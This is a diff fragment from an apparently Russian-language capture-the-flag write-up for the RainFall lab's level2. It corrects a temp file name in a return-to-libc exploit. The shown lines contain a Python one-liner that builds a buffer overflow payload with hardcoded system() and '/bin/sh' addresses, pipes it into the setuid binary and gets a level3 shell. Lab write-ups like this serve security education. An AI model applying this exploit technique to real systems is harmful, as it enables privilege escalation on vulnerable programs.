@@ -42,8 +42,8 @@ system -> 0xb7e6b060
 offset + system call + padding + string call
 
 7. Запустим нашу функцию
-level2@RainFall:~$ python -c "print 'x'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/level1
-level2@RainFall:~$ cat /tmp/level1 /dev/stdin | ./level2
+level2@RainFall:~$ python -c "print 'x'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/level2
+level2@RainFall:~$ cat /tmp/level2 /dev/stdin | ./level2
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>xxxxxxxxxxxx>`▒▒0000X▒▒▒
 whoami
 level3
